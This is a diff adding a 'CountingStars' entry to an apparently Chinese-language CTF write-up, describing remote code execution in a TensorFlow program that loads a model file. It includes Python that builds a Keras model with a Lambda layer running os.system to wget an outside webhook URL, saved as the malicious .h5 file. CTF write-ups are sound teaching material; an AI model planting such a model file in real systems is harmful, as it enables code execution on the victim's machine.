@@ -60,7 +60,26 @@ unicode绕过
 ```
 
 
-### 
+### CountingStars
+https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model
+
+一个输入经纬度计算星星数的程序,使用了tensorflow,会加载一个模型`counting_stars.h5`
+可以搜索到rce,当加载恶意模型的时候
+
+```python
+import tensorflow as tf
+
+def exploit(x):
+    import os
+    os.system("wget https://webhook.site/2f815642-00d7-472d-9507-2af34539836a")
+    return x
+
+model = tf.keras.Sequential()
+model.add(tf.keras.layers.Input(shape=(64,)))
+model.add(tf.keras.layers.Lambda(exploit))
+model.compile()
+model.save("counting_stars.h5")
+```
 
 # reverse
 
